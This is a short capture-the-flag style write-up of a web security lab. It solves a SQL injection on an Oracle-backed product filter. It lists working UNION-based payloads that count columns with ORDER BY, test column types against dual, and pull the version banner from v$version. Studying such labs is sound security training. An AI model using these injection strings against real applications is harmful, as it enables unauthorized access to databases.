# SQL injection attack, querying the database type and version on Oracle
# Objective
This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.\
\
To solve the lab, display the database version string.

# Solution
`/filter?category=Giftsâ€™` - Application is vulnerable 

## Determining the number of columns
`/filter?category=Gifts' order by 1--` \
`/filter?category=Gifts' order by 2--` \
`/filter?category=Gifts' order by 3--` -> Error -> Number of columns = 2

## Determining the types of columns
`/filter?category=Gifts' union select 'a','a' from dual--` - Both columns are string type

## Retrieving version of Oracle database
```
/filter?category=' union select banner,null from v$version--
```
